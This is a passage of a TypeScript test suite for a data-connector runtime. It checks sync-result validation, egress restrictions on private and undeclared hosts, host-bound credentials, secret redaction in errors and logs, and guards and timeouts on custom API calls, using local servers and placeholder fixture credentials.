      executeSync(
        connectorWith(manifest, () => ({
          observations: [],
          nextFrom,
          done: true,
        })),
        baseContext,
        request,
      );
    await expect(runWithout("2023-12-31T00:00:00.000Z")).resolves.toMatchObject(
      { nextFrom: "2023-12-31T00:00:00.000Z" },
    );
    await expect(runWithout("2023-12-30T23:59:59.000Z")).rejects.toThrow(
      /nextFrom more than 1 day before/,
    );
  });

  it("refuses a nextFrom that is not an ISO instant", async () => {
    await expect(run({ nextFrom: "x 2024", done: true })).rejects.toThrow(
      /invalid sync result/,
    );
  });

  it("ignores nextFrom on a page that is not final", async () => {
    const result = await run({
      nextFrom: "2030-01-01T00:00:00.000Z",
      nextCursor: "c",
      done: false,
    });
    expect(result.nextFrom).toBeUndefined();
  });
});

describe("host egress policy (#801)", () => {
  const toLocalhost: LookupFunction = (_hostname, options, callback) => {
    const entry = { address: "127.0.0.1", family: 4 };
    if (options.all) {
      (callback as unknown as (e: null, a: (typeof entry)[]) => void)(null, [
        entry,
      ]);
    } else {
      callback(null, entry.address, entry.family);
    }
  };

  async function withProvider(run: (port: number) => Promise<void>) {
    const server = createServer((req, res) => {
      res.setHeader("connection", "close");
      if (req.url === "/hang") return; // never answers
      res.writeHead(200, { "content-type": "application/json" });
      res.end("{}");
    });
    await new Promise<void>((resolve) =>
      server.listen(0, "127.0.0.1", resolve),
    );
    try {
      await run((server.address() as AddressInfo).port);
    } finally {
      server.closeAllConnections();
      server.close();
    }
  }

  function caller(url: string): Connector {
    return {
      ...connectorWith({
        ...demoManifest,
        outboundDomains: ["api.fixture.test"],
      }),
      check: async (_context, runtime) => {
        await runtime.fetch(url);
        return { ok: true };
      },
    };
  }

  it("passes the host's egress policy to runtime.fetch", async () => {
    await withProvider(async (port) => {
      const connector = caller(`http://api.fixture.test:${port}/ok`);
      const egress = { allowInsecureHttp: true, lookup: toLocalhost };
      await expect(
        executeCheck(connector, baseContext, {
          egress: { ...egress, allowPrivateHosts: ["api.fixture.test"] },
        }),
      ).resolves.toEqual({ ok: true });
      const refused = executeCheck(connector, baseContext, { egress });
      await expect(refused).rejects.toThrow(ContractViolationError);
      await expect(
        executeCheck(connector, baseContext, { egress }),
      ).rejects.toThrow(/non-public address/);
    });
  });

  it("lets a connection reach the host its configuration names (SDK 0.2.20, #873)", async () => {
    await withProvider(async (port) => {
      const selfHosted: Connector = {
        ...connectorWith({
          ...demoManifest,
          configSchema: {
            type: "object",
            properties: { host: { type: "string" } },
          },
          configuredHosts: ["host"],
        }),
        check: async (_context, runtime) => {
          await runtime.fetch(`http://posthog.fixture.test:${port}/ok`);
          return { ok: true };
        },
      };
      const egress = {
        allowInsecureHttp: true,
        lookup: toLocalhost,
        allowPrivateHosts: ["posthog.fixture.test"],
      };
      const withHost = (host: unknown): ConnectionContext => ({
        ...baseContext,
        config: { host },
      });
      await expect(
        executeCheck(selfHosted, withHost("posthog.fixture.test"), { egress }),
      ).resolves.toEqual({ ok: true });
      await expect(
        executeCheck(selfHosted, withHost("https://POSTHOG.fixture.test/"), {
          egress,
        }),
      ).resolves.toEqual({ ok: true });
      // Another connection's host, an invalid value or none: refused.
      for (const context of [
        withHost("other.fixture.test"),
        withHost("posthog.fixture.test:8000"),
        baseContext,
      ]) {
        await expect(
          executeCheck(selfHosted, context, { egress }),
        ).rejects.toThrow(/not in the connector's outboundDomains/);
      }
      // A manifest without configuredHosts ignores the config value.
      const undeclared: Connector = {
        ...selfHosted,
        manifest: { ...selfHosted.manifest, configuredHosts: undefined },
      };
      await expect(
        executeCheck(undeclared, withHost("posthog.fixture.test"), { egress }),
      ).rejects.toThrow(/not in the connector's outboundDomains/);
    });
  });

  it("sends credentials only to the configured host they are bound to (#884 review)", async () => {
    let requests = 0;
    const server = createServer((_req, res) => {
      requests += 1;
      res.setHeader("connection", "close");
      res.writeHead(200, { "content-type": "application/json" });
      res.end("{}");
    });
    await new Promise<void>((resolve) =>
      server.listen(0, "127.0.0.1", resolve),
    );
    const { port } = server.address() as AddressInfo;
    try {
      const seen: Array<Record<string, unknown>> = [];
      const selfHosted: Connector = {
        ...connectorWith({
          ...demoManifest,
          configSchema: {
            type: "object",
            properties: { host: { type: "string" } },
          },
          configuredHosts: ["host"],
        }),
        check: async (context, runtime) => {
          seen.push(context.credentials);
          await runtime.fetch(
            `http://${String(context.config.host)}:${port}/ok`,
          );
          return { ok: true };
        },
      };
      const egress = {
        allowInsecureHttp: true,
        lookup: toLocalhost,
        allowPrivateHosts: ["old.fixture.test", "new.fixture.test"],
      };
      const call = (host: string, credentials: Record<string, unknown>) =>
        executeCheck(
          selfHosted,
          { ...baseContext, config: { host }, credentials },
          { egress },
        );

      // Bound to the host they were entered with: sent, without the binding.
      await expect(
        call("old.fixture.test", {
          token: "secret-0001",
          [CREDENTIAL_HOSTS_KEY]: ["old.fixture.test"],
        }),
      ).resolves.toEqual({ ok: true });
      expect(seen).toEqual([{ token: "secret-0001" }]);
      expect(requests).toBe(1);

      // The same stored key with a draft config naming another host, and an
      // unbound key with a configured host: refused before any request.
      for (const credentials of [
        { token: "secret-0001", [CREDENTIAL_HOSTS_KEY]: ["old.fixture.test"] },
        { token: "secret-0001" },
      ]) {
        const refused = await call("new.fixture.test", credentials).catch(
          (error: unknown) => error,
        );
        expect(refused).toBeInstanceOf(CredentialHostMismatchError);
        expect((refused as CredentialHostMismatchError).code).toBe(
          CREDENTIAL_HOST_MISMATCH_CODE,
        );
      }
      expect(requests).toBe(1);
      expect(seen).toHaveLength(1);
      // Sync and discover refuse the same way.
      await expect(
        executeSync(
          selfHosted,
          {
            ...baseContext,
            config: { host: "new.fixture.test" },
            credentials: {
              token: "secret-0001",
              [CREDENTIAL_HOSTS_KEY]: ["old.fixture.test"],
            },
          },
          request,
        ),
      ).rejects.toBeInstanceOf(CredentialHostMismatchError);
      await expect(
        executeDiscover(selfHosted, {
          ...baseContext,
          config: { host: "new.fixture.test" },
          credentials: { token: "secret-0001" },
        }),
      ).rejects.toBeInstanceOf(CredentialHostMismatchError);
    } finally {
      server.closeAllConnections();
      server.close();
    }
  });

  describe("connector private hosts (NETRICS_CONNECTOR_PRIVATE_HOSTS, #892)", () => {
    function selfHostedOn(port: number, seen: string[] = []): Connector {
      return {
        ...connectorWith({
          ...demoManifest,
          outboundDomains: ["api.fixture.test"],
          configSchema: {
            type: "object",
            properties: { host: { type: "string" } },
          },
          configuredHosts: ["host"],
        }),
        check: async (context, runtime) => {
          const target = String(context.config.target ?? context.config.host);
          seen.push(target);
          await runtime.fetch(`http://${target}:${port}/ok`);
          return { ok: true };
        },
      };
    }
    const egress = { allowInsecureHttp: true, lookup: toLocalhost };
    const at = (host: string, target?: string): ConnectionContext => ({
      ...baseContext,
      config: { host, ...(target ? { target } : {}) },
    });

    it("refuses a private configured host by default", async () => {
      await withProvider(async (port) => {
        await expect(
          executeCheck(selfHostedOn(port), at("posthog.fixture.test"), {
            egress,
          }),
        ).rejects.toThrow(/non-public address/);
      });
    });

    it("lets a listed configured host resolve to a private address", async () => {
      await withProvider(async (port) => {
        for (const entries of [["posthog.fixture.test"], ["127.0.0.0/8"]]) {
          await expect(
            executeCheck(selfHostedOn(port), at("posthog.fixture.test"), {
              egress,
              connectorPrivateHosts: entries,
            }),
          ).resolves.toEqual({ ok: true });
        }
      });
    });

    it("keeps refusing an unlisted configured host and the manifest's domains", async () => {
      await withProvider(async (port) => {
        await expect(
          executeCheck(selfHostedOn(port), at("posthog.fixture.test"), {
            egress,
            connectorPrivateHosts: ["intranet.example"],
          }),
        ).rejects.toThrow(/non-public address/);
        // A range listed for the configured host does not open the
        // manifest domain, which resolves privately here too.
        await expect(
          executeCheck(
            selfHostedOn(port),
            at("posthog.fixture.test", "api.fixture.test"),
            {
              egress,
              connectorPrivateHosts: ["127.0.0.0/8", "*.fixture.test"],
            },
          ),
        ).rejects.toThrow(
          /api\.fixture\.test resolves to a non-public address/,
        );
        // A manifest without configuredHosts gets nothing from it.
        const plain = caller(`http://api.fixture.test:${port}/ok`);
        await expect(
          executeCheck(plain, baseContext, {
            egress,
            connectorPrivateHosts: ["api.fixture.test"],
          }),
        ).rejects.toThrow(/non-public address/);
      });
    });

    it("never sends credentials to a host they were not entered for", async () => {
      await withProvider(async (port) => {
        const seen: string[] = [];
        const options = {
          egress,
          connectorPrivateHosts: ["old.fixture.test", "new.fixture.test"],
        };
        const bound = {
          token: "secret-0001",
          [CREDENTIAL_HOSTS_KEY]: ["old.fixture.test"],
        };
        await expect(
          executeCheck(
            selfHostedOn(port, seen),
            { ...at("old.fixture.test"), credentials: bound },
            options,
          ),
        ).resolves.toEqual({ ok: true });
        // Listing the other host lifts no binding: refused before any call.
        await expect(
          executeCheck(
            selfHostedOn(port, seen),
            { ...at("new.fixture.test"), credentials: bound },
            options,
          ),
        ).rejects.toBeInstanceOf(CredentialHostMismatchError);
        expect(seen).toEqual(["old.fixture.test"]);
      });
    });
  });

  it("treats an egress timeout as a retryable provider failure", async () => {
    await withProvider(async (port) => {
      const failure = await executeCheck(
        caller(`http://api.fixture.test:${port}/hang`),
        baseContext,
        {
          egress: {
            allowInsecureHttp: true,
            lookup: toLocalhost,
            allowPrivateHosts: ["api.fixture.test"],
            requestTimeoutMs: 100,
          },
        },
      ).then(
        () => null,
        (error: unknown) => error,
      );
      expect(failure).toBeInstanceOf(Error);
      expect(failure).not.toBeInstanceOf(ContractViolationError);
      expect((failure as Error).message).toMatch(/egress timeout/);
    });
  });
});

describe("redactValues (custom API)", () => {
  it("redacts extra values from errors, check messages and logs", async () => {
    const derived = "Basic ZngtdXNlcjpmeC1wYXNzLTAwMDE=";
    const context: ConnectionContext = {
      ...baseContext,
      credentials: { username: "fx-user", password: "fx-pass-0001" },
    };
    const lines: string[] = [];
    const failing: Connector = {
      ...connectorWith(demoManifest),
      async sync(_context, _request, runtime) {
        runtime.log?.warn(`sent ${derived}`, { header: derived });
        throw new Error(`refused ${derived}`);
      },
    };
    const options = {
      redactValues: [derived],
      log: (entry: { message: string; fields: Record<string, unknown> }) =>
        lines.push(JSON.stringify(entry)),
    };
    const error = (await executeSync(failing, context, request, options).catch(
      (e: unknown) => e,
    )) as Error;
    expect(error.message).toBe("refused [redacted]");
    expect(lines.join()).not.toContain("ZngtdXNlcjpmeC1wYXNzLTAwMDE=");
    expect(lines.join()).toContain("[redacted]");

    const checked = await executeCheck(
      connectorWith(demoManifest, undefined, () => ({
        ok: false,
        message: `the API echoed ${derived}`,
      })),
      context,
      options,
    );
    expect(checked.message).toBe("the API echoed [redacted]");
    // Without the option, the derived value is not known to the runtime.
    const plain = await executeCheck(
      connectorWith(demoManifest, undefined, () => ({
        ok: false,
        message: `the API echoed ${derived}`,
      })),
      context,
    );
    expect(plain.message).toContain(derived);
  });
});

describe("custom-api call options guard (ADR 0027)", () => {
  it("refuses to run custom-api without its call options", async () => {
    const custom = connectorWith({ ...demoManifest, id: "custom-api" });
    for (const options of [
      {},
      { egress: { redirects: "allowlist" as const }, redactValues: [] },
      { egress: { redirects: "same-host" as const } },
      // Look-alike options built by hand, without customApiCallOptions.
      { egress: { redirects: "same-host" as const }, redactValues: [] },
      customApiCallOptions({ egress: { redirects: "allowlist" } }),
    ]) {
      await expect(
        executeCheck(custom, baseContext, options),
      ).rejects.toBeInstanceOf(ContractViolationError);
      await expect(
        executeSync(custom, baseContext, request, options),
      ).rejects.toBeInstanceOf(ContractViolationError);
      await expect(
        executeDiscover(custom, baseContext, options),
      ).rejects.toBeInstanceOf(ContractViolationError);
    }
    const marked = customApiCallOptions({
      egress: { redirects: "same-host" },
      redactValues: [],
    });
    expect(await executeCheck(custom, baseContext, marked)).toEqual({
      ok: true,
    });
    // The mark survives spreading, as call sites add their own options.
    expect(
      await executeCheck(custom, baseContext, { ...marked, timeoutMs: 5_000 }),
    ).toEqual({ ok: true });
    // Bundled connectors need nothing extra.
    expect(
      await executeCheck(connectorWith(demoManifest), baseContext, {}),
    ).toEqual({ ok: true });
  });
});

describe("executeTrustedCall (#809)", () => {
  const secretContext: ConnectionContext = {
    ...baseContext,
    credentials: { token: "secret-token-0001" },
  };

  it("hands the call a runtime and returns its result", async () => {
    const result = await executeTrustedCall(
      connectorWith(demoManifest),
      baseContext,
      {},
      async (runtime) => typeof runtime.fetch,
    );
    expect(result).toBe("function");
  });

  it("bounds the call by timeoutMs and aborts its signal", async () => {
    let signal: AbortSignal | undefined;
    const error = await executeTrustedCall(
      connectorWith(demoManifest),
      baseContext,
      { timeoutMs: 30 },
      (runtime) => {
        signal = runtime.signal;
        return new Promise<never>(() => undefined);
      },
    ).catch((caught: unknown) => caught);
    expect(error).toBeInstanceOf(Error);
    expect((error as Error).message).toMatch(/did not answer within 30 ms/);
    expect(signal?.aborted).toBe(true);
  });

  it("redacts the connection's credentials and redactValues from a thrown error", async () => {
    const error = (await executeTrustedCall(
      connectorWith(demoManifest),
      secretContext,
      { redactValues: ["Bearer secret-token-0001", "derived-0001"] },
      async () => {
        throw new Error("echoed secret-token-0001 and derived-0001");
      },
    ).catch((caught: unknown) => caught)) as Error;
    expect(error.message).not.toContain("secret-token-0001");
    expect(error.message).not.toContain("derived-0001");
  });

  it("allows only the manifest's outboundDomains", async () => {
    const error = await executeTrustedCall(
      connectorWith(demoManifest),
      baseContext,
      {},
      (runtime) => runtime.fetch("https://not-declared.example/a.png"),
    ).catch((caught: unknown) => caught);
    expect(error).toBeInstanceOf(ContractViolationError);
  });

  it("refuses custom-api without its call options", async () => {
    await expect(
      executeTrustedCall(
        connectorWith({ ...demoManifest, id: "custom-api" }),
        baseContext,
        {},
        async () => "ran",
      ),
    ).rejects.toBeInstanceOf(ContractViolationError);
  });
});

describe("skipped (SDK 0.2.23, #898)", () => {
  const withCursor: SyncRequest = {
    ...request,
    mode: "incremental",
    cursor: "kept",
  };
  const run = (result: object, req: SyncRequest = withCursor) =>
    executeSync(
      connectorWith(demoManifest, () => ({ observations: [], ...result })),
      baseContext,
      req,
    );

  it("passes a final result that read nothing and keeps the cursor", async () => {
    await expect(
      run({ skipped: true, nextCursor: "kept", done: true }),
    ).resolves.toMatchObject({ skipped: true, done: true });
  });

  it("refuses a skipped result that is not final, carries data or moves the cursor", async () => {
    for (const result of [
      { skipped: true, nextCursor: "kept", done: false },
      { skipped: true, done: true },
      { skipped: true, nextCursor: "moved", done: true },
      {
        skipped: true,
        nextCursor: "kept",
        observations: [observation()],
        done: true,
      },
      {
        skipped: true,
        nextCursor: "kept",
        nextFrom: request.from,
        done: true,
      },
    ]) {
      await expect(run(result), JSON.stringify(result)).rejects.toThrow(
        /skipped result/,
      );
    }
    // Never for a backfill, nor for a run without a cursor: their window
    // (and a backfill's history) would count as read.
    await expect(
      run(
        { skipped: true, nextCursor: "kept", done: true },
        { ...withCursor, mode: "backfill" },
      ),
    ).rejects.toThrow(/skipped result/);
    const { cursor: _cursor, ...first } = withCursor;
    await expect(run({ skipped: true, done: true }, first)).rejects.toThrow(
      /skipped result/,
    );
    // Only `true`: a connector that did run says nothing.
    await expect(
      run({ skipped: false, nextCursor: "kept", done: true }),
    ).rejects.toThrow(/invalid sync result/);
  });
});
